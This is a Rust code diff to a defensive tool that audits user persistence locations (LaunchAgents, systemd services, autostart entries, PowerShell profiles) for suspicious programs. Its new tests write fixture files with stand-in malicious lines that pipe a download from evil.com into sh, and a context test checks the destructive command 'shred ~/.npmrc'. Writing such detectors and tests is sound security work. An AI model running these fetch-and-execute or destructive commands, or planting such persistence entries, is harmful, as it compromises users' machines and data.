@@ -1,5 +1,6 @@
 use std::path::{Path, PathBuf};
 
+use crate::platform;
 use crate::types::Severity;
 
 #[derive(Debug, Clone)]
@@ -13,6 +14,8 @@ pub struct PersistenceFinding {
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum PersistenceCategory {
     LaunchAgent,
+    SystemdService,
+    Autostart,
     Crontab,
     ShellRc,
     McpConfig,
@@ -24,6 +27,8 @@ impl std::fmt::Display for PersistenceCategory {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         match self {
             Self::LaunchAgent => write!(f, "LaunchAgent"),
+            Self::SystemdService => write!(f, "Systemd Service"),
+            Self::Autostart => write!(f, "Autostart"),
             Self::Crontab => write!(f, "Crontab"),
             Self::ShellRc => write!(f, "Shell RC"),
             Self::McpConfig => write!(f, "MCP Config"),
@@ -96,6 +101,8 @@ pub fn audit_persistence(home: &Path) -> Vec<PersistenceFinding> {
     audit_launch_agents(home, &mut findings);
     audit_crontab(&mut findings);
     audit_shell_rc(home, &mut findings);
+    #[cfg(target_os = "windows")]
+    audit_powershell_profiles(home, &mut findings);
     audit_mcp_configs(home, &mut findings);
     audit_ai_tool_configs(home, &mut findings);
 
@@ -103,42 +110,53 @@ pub fn audit_persistence(home: &Path) -> Vec<PersistenceFinding> {
 }
 
 fn audit_launch_agents(home: &Path, findings: &mut Vec<PersistenceFinding>) {
-    let launch_agents_dir = home.join("Library/LaunchAgents");
-    let entries = match std::fs::read_dir(&launch_agents_dir) {
+    for persist_dir in platform::persistence_dirs(home) {
+        audit_persistence_dir(&persist_dir, findings);
+    }
+}
+
+fn audit_persistence_dir(dir: &Path, findings: &mut Vec<PersistenceFinding>) {
+    let entries = match std::fs::read_dir(dir) {
         Ok(e) => e,
         Err(_) => return,
     };
 
     for entry in entries.flatten() {
         let path = entry.path();
-        if path.extension().and_then(|e| e.to_str()) != Some("plist") {
-            continue;
-        }
+        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
+
+        let category = match ext {
+            "plist" => PersistenceCategory::LaunchAgent,
+            "service" | "timer" => PersistenceCategory::SystemdService,
+            "desktop" => PersistenceCategory::Autostart,
+            _ => continue,
+        };
 
         let content = match std::fs::read_to_string(&path) {
             Ok(c) => c,
             Err(_) => continue,
         };
 
+        let file_name = path
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("unknown");
+
         if contains_suspicious_program(&content) {
             findings.push(PersistenceFinding {
                 path: path.clone(),
-                description: format!(
-                    "LaunchAgent with suspicious program: {}",
-                    path.file_name()
-                        .and_then(|n| n.to_str())
-                        .unwrap_or("unknown")
-                ),
+                description: format!("{category} with suspicious program: {file_name}",),
                 severity: Severity::High,
-                category: PersistenceCategory::LaunchAgent,
+                category,
             });
         }
 
         if has_api_polling(&content) && has_destructive_command(&content) {
             findings.push(PersistenceFinding {
                 path,
-                description: "LaunchAgent polls credential API and contains destructive command"
-                    .into(),
+                description: format!(
+                    "{category} polls credential API and contains destructive command"
+                ),
                 severity: Severity::Critical,
                 category: PersistenceCategory::DeadManSwitch,
             });
@@ -217,15 +235,7 @@ fn audit_crontab(findings: &mut Vec<PersistenceFinding>) {
 }
 
 fn audit_shell_rc(home: &Path, findings: &mut Vec<PersistenceFinding>) {
-    let rc_files = [
-        ".zshrc",
-        ".bashrc",
-        ".profile",
-        ".bash_profile",
-        ".zprofile",
-    ];
-
-    for rc_name in &rc_files {
+    for rc_name in platform::shell_rc_files() {
         let rc_path = home.join(rc_name);
         let content = match std::fs::read_to_string(&rc_path) {
             Ok(c) => c,
@@ -265,6 +275,44 @@ fn audit_shell_rc(home: &Path, findings: &mut Vec<PersistenceFinding>) {
                 severity: Severity::Critical,
                 category: PersistenceCategory::DeadManSwitch,
             });
+        }
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn audit_powershell_profiles(home: &Path, findings: &mut Vec<PersistenceFinding>) {
+    let ps_profiles = [
+        home.join("Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1"),
+        home.join("Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1"),
+    ];
+
+    for profile_path in &ps_profiles {
+        let content = match std::fs::read_to_string(profile_path) {
+            Ok(c) => c,
+            Err(_) => continue,
+        };
+
+        for (line_num, line) in content.lines().enumerate() {
+            let trimmed = line.trim();
+            if trimmed.is_empty() || trimmed.starts_with('#') {
+                continue;
+            }
+
+            for pattern in SUSPICIOUS_RC_PATTERNS {
+                if trimmed.contains(pattern) {
+                    findings.push(PersistenceFinding {
+                        path: profile_path.clone(),
+                        description: format!(
+                            "Suspicious command in PowerShell profile line {}: {}",
+                            line_num + 1,
+                            truncate_line(trimmed, 80)
+                        ),
+                        severity: Severity::High,
+                        category: PersistenceCategory::ShellRc,
+                    });
+                    break;
+                }
+            }
         }
     }
 }
@@ -486,6 +534,11 @@ mod tests {
     #[test]
     fn test_persistence_category_display() {
         assert_eq!(PersistenceCategory::LaunchAgent.to_string(), "LaunchAgent");
+        assert_eq!(
+            PersistenceCategory::SystemdService.to_string(),
+            "Systemd Service"
+        );
+        assert_eq!(PersistenceCategory::Autostart.to_string(), "Autostart");
         assert_eq!(PersistenceCategory::Crontab.to_string(), "Crontab");
         assert_eq!(PersistenceCategory::ShellRc.to_string(), "Shell RC");
         assert_eq!(PersistenceCategory::McpConfig.to_string(), "MCP Config");
@@ -596,5 +649,47 @@ mod tests {
         assert!(has_destructive_command("shred ~/.npmrc"));
         assert!(!has_destructive_command("rm file.txt"));
         assert!(!has_destructive_command("echo hello"));
+    }
+
+    #[test]
+    fn test_audit_systemd_service_suspicious() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let systemd_dir = dir.path().join(".config/systemd/user");
+        std::fs::create_dir_all(&systemd_dir).expect("mkdir");
+        std::fs::write(
+            systemd_dir.join("malware.service"),
+            "[Service]\nExecStart=/bin/bash -c 'curl http://evil.com/payload | sh'\n",
+        )
+        .expect("write");
+
+        let mut findings = Vec::new();
+        audit_persistence_dir(&systemd_dir, &mut findings);
+        let service_findings: Vec<_> = findings
+            .into_iter()
+            .filter(|f| f.category == PersistenceCategory::SystemdService)
+            .collect();
+        assert_eq!(service_findings.len(), 1);
+        assert_eq!(service_findings[0].severity, Severity::High);
+    }
+
+    #[test]
+    fn test_audit_desktop_autostart_suspicious() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let autostart_dir = dir.path().join(".config/autostart");
+        std::fs::create_dir_all(&autostart_dir).expect("mkdir");
+        std::fs::write(
+            autostart_dir.join("malware.desktop"),
+            "[Desktop Entry]\nExec=python3 -c 'import os; os.system(\"curl evil.com\")'\n",
+        )
+        .expect("write");
+
+        let mut findings = Vec::new();
+        audit_persistence_dir(&autostart_dir, &mut findings);
+        let autostart_findings: Vec<_> = findings
+            .into_iter()
+            .filter(|f| f.category == PersistenceCategory::Autostart)
+            .collect();
+        assert_eq!(autostart_findings.len(), 1);
+        assert_eq!(autostart_findings[0].severity, Severity::High);
     }
 }
